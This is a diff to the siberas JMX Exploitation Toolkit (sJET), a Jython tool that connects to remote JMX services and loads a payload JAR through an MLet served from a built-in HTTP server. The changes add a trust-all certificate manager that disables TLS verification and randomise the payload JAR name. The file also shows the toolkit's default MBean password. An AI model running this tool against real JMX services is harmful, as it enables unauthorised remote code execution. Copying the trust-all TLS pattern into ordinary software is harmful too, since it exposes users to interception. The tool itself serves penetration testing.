@@ -5,8 +5,10 @@ from javax.management.remote import JMXConnectorFactory
 from javax.management import ObjectName
 from java.lang import String
 from java.lang import Object
+from jarray import array
 from java.io import IOException
-
+from javax.net.ssl import TrustManager, X509TrustManager
+from javax.net.ssl import SSLContext
 # BaseHTTPServer needed to serve mlets
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 from threading import Thread
@@ -18,14 +20,32 @@ import jarray
 # Extra
 import argparse
 import base64
+import random
+import string
+
 
 authorSignature =  'sJET - siberas JMX Exploitation Toolkit\n'
 authorSignature += '======================================='
+
+class TrustAllX509TrustManager(X509TrustManager):
+    def checkClientTrusted(self, chain, auth):
+        pass
+
+    def checkServerTrusted(self,chain,auth):
+        pass
+
+    def getAcceptedIssuers(self):
+        return None
 
 
 ### AUX ###
 def connectToJMX(args):
     # Basic JMX connection, always required
+    trust_managers = array([TrustAllX509TrustManager()], TrustManager)
+
+    sc = SSLContext.getInstance("SSL")
+    sc.init(None, trust_managers, None)
+    SSLContext.setDefault(sc)
     jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args.targetHost + ":" + args.targetPort + "/jmxrmi")
     print "[+] Connecting to: " + str(jmx_url)
     try:
@@ -82,6 +102,8 @@ def installMBeans(args, bean_server):
             # Change the password from "I+n33d+a+glass+0f+watta" to the new value
             print "[+] Changing default password..."
             changePassword("I+n33d+a+glass+0f+watta", args.password, bean_server)
+        else:
+            print res
 
 
 
@@ -105,21 +127,23 @@ def MakeHandlerClass(base_url):
     # Needed during installation of the JAR
     class CustomHandler(BaseHTTPRequestHandler):
 
+
         def __init__(self, *args, **kwargs):
              self._base_url = base_url
+             self.jar_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8)) + '.jar'
              BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
 
         #Handler for the GET requests
         def do_GET(self):
             if self.path=="/":
-                mlet_code = '<html><mlet code="de.siberas.lab.SiberasPayload" archive="siberas_mlet.jar" name="Siberas:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'
+                mlet_code = '<html><mlet code="de.siberas.lab.SiberasPayload" archive="' + self.jar_name + '" name="Siberas:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'
 
                 self.send_response(200)
                 self.send_header('Pragma', 'no-cache')
                 self.end_headers()
                 self.wfile.write(mlet_code)
 
-            elif self.path=="/siberas_mlet.jar":
+            elif self.path.endswith('.jar'):
                 f = open("./payloads/siberas_mlet.jar")
                 self.send_response(200)
                 self.send_header('Content-type', 'application/jar')
